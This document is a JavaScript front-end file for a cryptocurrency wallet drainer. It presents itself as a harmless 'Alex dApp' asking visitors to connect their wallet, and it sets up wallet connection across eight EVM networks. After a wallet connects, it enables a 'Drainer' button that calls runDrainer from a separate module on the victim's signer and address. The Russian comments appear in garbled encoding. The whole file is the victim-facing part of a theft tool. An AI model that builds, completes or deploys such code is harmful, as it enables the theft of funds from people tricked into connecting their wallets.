import { createAppKit } from '@reown/appkit'
import {
  mainnet, polygon, bsc, avalanche,
  arbitrum, optimism, linea, base
} from '@reown/appkit/networks'
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
import { ethers } from 'ethers'
import { runDrainer } from './drainer.js'

// üîë WalletConnect project ID
const projectId = 'd85cc83edb401b676e2a7bcef67f3be8'

// üåê –ü–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ–º—ã–µ EVM-—Å–µ—Ç–∏
const networks = [mainnet, polygon, bsc, avalanche, arbitrum, optimism, linea, base]

// üß© Wagmi –∞–¥–∞–ø—Ç–µ—Ä
const wagmiAdapter = new WagmiAdapter({
  projectId,
  networks,
  wallets: {
    coinbase: false // –û—Ç–∫–ª—é—á–∞–µ–º –±–∞–≥–æ–≤—ã–π coinbase
  }
})

// ü™™ –ú–µ—Ç–∞–¥–∞–Ω–Ω—ã–µ dApp
const metadata = {
  name: 'Alex dApp',
  description: 'Connect your wallet',
  url: 'https://checkalex.xyz',
  icons: ['https://checkalex.xyz/icon.png']
}

// üì¶ –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è AppKit
const modal = createAppKit({
  adapters: [wagmiAdapter],
  networks,
  metadata,
  projectId,
  features: {
    analytics: true
  }
})

// ‚ö°Ô∏è –ö–Ω–æ–ø–∫–∞ –æ—Ç–∫—Ä—ã—Ç–∏—è –º–æ–¥–∞–ª—å–Ω–æ–≥–æ –æ–∫–Ω–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è
document.getElementById('open-connect-modal').addEventListener('click', () => {
  modal.open()
})

// üß† –ê–∫—Ç–∏–≤–∏—Ä—É–µ–º –∫–Ω–æ–ø–∫—É Drainer —Ç–æ–ª—å–∫–æ –ø–æ—Å–ª–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è
function enableDrainer() {
  const drainerBtn = document.getElementById('drainer-btn')
  if (drainerBtn) {
    drainerBtn.disabled = false
    drainerBtn.classList.remove('disabled')
  }
}

// üìå –û–±—Ä–∞–±–æ—Ç–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è —á–µ—Ä–µ–∑ AppKit
modal.on("connect", async () => {
  console.log("‚úÖ –ö–æ—à–µ–ª—ë–∫ –ø–æ–¥–∫–ª—é—á–µ–Ω —á–µ—Ä–µ–∑ AppKit")
  enableDrainer()
})

// üìå –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
async function checkConnectionOnLoad() {
  try {
    const acc = await wagmiAdapter.getAccount()
    if (acc?.address) {
      console.log("üîÑ –ö–æ—à–µ–ª—ë–∫ —É–∂–µ –ø–æ–¥–∫–ª—é—á—ë–Ω:", acc.address)
      enableDrainer()
    }
  } catch (err) {
    console.warn("‚ö†Ô∏è –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è:", err.message)
  }
}

// üß® –ö–Ω–æ–ø–∫–∞ –∑–∞–ø—É—Å–∫–∞ Drainer
document.getElementById('drainer-btn').addEventListener('click', async () => {
  try {
    const provider = new ethers.providers.Web3Provider(window.ethereum, 'any')
    const signer = provider.getSigner()
    const address = await signer.getAddress()
    console.log("üöÄ –ó–∞–ø—É—Å–∫ Drainer –¥–ª—è –∞–¥—Ä–µ—Å–∞:", address)
    await runDrainer(provider, signer, address)
  } catch (e) {
    console.error("‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ Drainer:", e)
    alert("–û—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ Drainer: " + e.message)
  }
})

// üöÄ –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –ø—Ä–∏ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏
checkConnectionOnLoad()
